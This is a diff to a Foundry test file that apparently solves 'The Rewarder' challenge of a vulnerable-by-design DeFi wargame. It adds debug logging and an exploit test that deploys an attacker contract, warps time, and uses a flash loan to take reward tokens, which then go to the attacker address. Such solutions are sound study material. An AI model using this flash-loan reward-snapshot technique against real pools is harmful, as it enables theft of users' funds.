@@ -9,6 +9,7 @@ import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPo
 import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
+import {TheRewarderAttacker} from "../../../src/Solutions/the-rewarder/TheRewarderAttacker.sol";
 
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
@@ -52,6 +53,11 @@ contract TheRewarder is Test {
 
         theRewarderPool = new TheRewarderPool(address(dvt));
 
+        console.log("Alice : ", theRewarderPool.accToken().balanceOf(alice));
+        console.log("lastSnapshotIdForRewards : ", theRewarderPool.lastSnapshotIdForRewards());
+        console.log("lastRecordedSnapshotTimestamp : ", theRewarderPool.lastRecordedSnapshotTimestamp());
+        console.log("total Supply At : ", theRewarderPool.accToken().totalSupplyAt(theRewarderPool.lastSnapshotIdForRewards()));
+
         // Alice, Bob, Charlie and David deposit 100 tokens each
         for (uint8 i; i < 4; i++) {
             dvt.transfer(users[i], USER_DEPOSIT);
@@ -61,6 +67,8 @@ contract TheRewarder is Test {
             assertEq(theRewarderPool.accToken().balanceOf(users[i]), USER_DEPOSIT);
             vm.stopPrank();
         }
+
+        console.log("lastSnapshotIdForRewards : ", theRewarderPool.lastSnapshotIdForRewards());
 
         assertEq(theRewarderPool.accToken().totalSupply(), USER_DEPOSIT * 4);
         assertEq(theRewarderPool.rewardToken().totalSupply(), 0);
@@ -85,10 +93,27 @@ contract TheRewarder is Test {
     }
 
     function testExploit() public {
+        /* use flash loan for reward */
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        uint256 dvtInPool = dvt.balanceOf(address(flashLoanerPool));
+        TheRewarderAttacker attackerContract = new TheRewarderAttacker(
+            address(flashLoanerPool),
+            address(theRewarderPool),
+            address(dvt)
+        );
+        vm.warp(block.timestamp + 5 days);
+        attackerContract.attack(dvtInPool);
+        uint256 rewardValue = theRewarderPool.rewardToken().balanceOf(address(attackerContract));
+        console.log("Result : ", rewardValue);
+        vm.stopPrank();
 
+        //transfer reward token to attacker
+        vm.startPrank(address(attackerContract));
+        theRewarderPool.rewardToken().transfer(attacker, rewardValue);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
